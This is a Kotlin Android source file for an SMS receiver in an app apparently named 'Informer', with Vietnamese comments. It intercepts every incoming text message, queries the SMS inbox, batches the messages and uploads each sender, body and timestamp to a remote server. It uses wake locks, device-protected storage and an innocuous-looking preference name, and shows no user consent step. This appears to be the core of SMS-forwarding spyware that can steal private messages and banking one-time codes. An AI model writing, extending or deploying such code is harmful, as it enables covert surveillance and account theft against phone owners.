package com.example.informer

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Telephony
import android.util.Log

class SmsReceiver : BroadcastReceiver() {

    companion object {
        private const val BATCH_WINDOW_MS = 3000L 
        private val messageList = mutableListOf<SmsData>()
        private var pendingTask: Runnable? = null
        private val handler = Handler(Looper.getMainLooper())
    }

    data class SmsData(val sender: String, val body: String, val timestamp: Long)

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        if (messages.isNullOrEmpty()) return

        val smsTimestamp = messages[0].timestampMillis
        val rawNumber = messages[0].originatingAddress ?: "Unknown"
        val formattedNumber = DeviceUtils.formatVietnamesePhoneNumber(rawNumber)
        val fullContent = messages.joinToString("") { it.messageBody ?: "" }

        Log.d("SMS_RECEIVER", "📩 SMS_RECEIVED from=$formattedNumber")

        val safeContext = context.deviceProtectedContext()
        val pendingResult = goAsync()
        
        // GIẢM DELAY: Chỉ đợi 300ms thay vì 400ms để bắt ID DB
        handler.postDelayed({
            try {
                val smsIdInDb = getSmsIdFromDb(safeContext, rawNumber, fullContent, smsTimestamp)
                val dedupePref = safeContext.getSharedPreferences("AppInternalStateV4", Context.MODE_PRIVATE)
                
                val cleanBody = fullContent.replace("\\s".toRegex(), "")
                val tsSec = smsTimestamp / 1000
                val msgKey = if (smsIdInDb != null) "ID_$smsIdInDb" else "KEY_${formattedNumber}_${cleanBody}_$tsSec"
                
                if (dedupePref.contains(msgKey)) {
                    Log.d("SMS_RECEIVER", "⏭️ SMS trùng lặp, bỏ qua (key=$msgKey)")
                    pendingResult.finish()
                    return@postDelayed
                }

                // Ghi nhật ký ngay để tránh trùng lặp nếu crash
                dedupePref.edit().putBoolean(msgKey, true).commit()

                val displayName = DeviceUtils.getDisplayName(context, formattedNumber)
                synchronized(messageList) {
                    messageList.add(SmsData(displayName, fullContent, smsTimestamp))
                    
                    // Nếu là tin nhắn lẻ, gửi sau 1s. Nếu tin nhắn dồn dập, gom vào batch 3s.
                    val delay = if (messageList.size == 1) 1000L else BATCH_WINDOW_MS
                    pendingTask?.let { handler.removeCallbacks(it) }

                    val sendTask = Runnable {
                        val toSend: List<SmsData>
                        synchronized(messageList) {
                            toSend = messageList.sortedBy { it.timestamp }
                            messageList.clear()
                            pendingTask = null
                        }
                        if (toSend.isEmpty()) { 
                            pendingResult.finish()
                            return@Runnable 
                        }

                        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
                        val wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Informer:SmsBatchWakeLock")
                        wakeLock.acquire(45_000) // Giảm xuống 45s cho an toàn hệ thống

                        kotlin.concurrent.thread {
                            try {
                                for (msg in toSend) {
                                    Log.d("SMS_RECEIVER", "🚀 Đang đẩy SMS từ ${msg.sender}...")
                                    val ok = ServerReporter.sendEventSync(safeContext, "SMS", msg.sender, msg.body, msg.timestamp)
                                    if (!ok) Log.w("SMS_RECEIVER", "⚠️ Đẩy SMS thất bại")
                                    Thread.sleep(100)
                                }
                            } catch (e: Exception) {
                                Log.e("SMS_RECEIVER", "❌ Lỗi luồng gửi: ${e.message}")
                            } finally {
                                if (wakeLock.isHeld) wakeLock.release()
                                pendingResult.finish()
                                Log.d("SMS_RECEIVER", "🏁 Xử lý xong batch.")
                            }
                        }
                    }
                    pendingTask = sendTask
                    handler.postDelayed(sendTask, delay)
                }
            } catch (e: Exception) {
                Log.e("SMS_RECEIVER", "❌ Lỗi xử lý: ${e.message}")
                pendingResult.finish()
            }
        }, 300)
    }

    private fun getSmsIdFromDb(context: Context, address: String?, body: String, timestamp: Long): Long? {
        return try {
            val cursor = context.contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf("_id"),
                "address = ? AND body = ? AND date >= ? AND date <= ?",
                arrayOf(address, body, (timestamp - 5000L).toString(), (timestamp + 5000L).toString()),
                "date DESC LIMIT 1"
            )
            cursor?.use { if (it.moveToFirst()) it.getLong(0) else null }
        } catch (e: Exception) { null }
    }
}
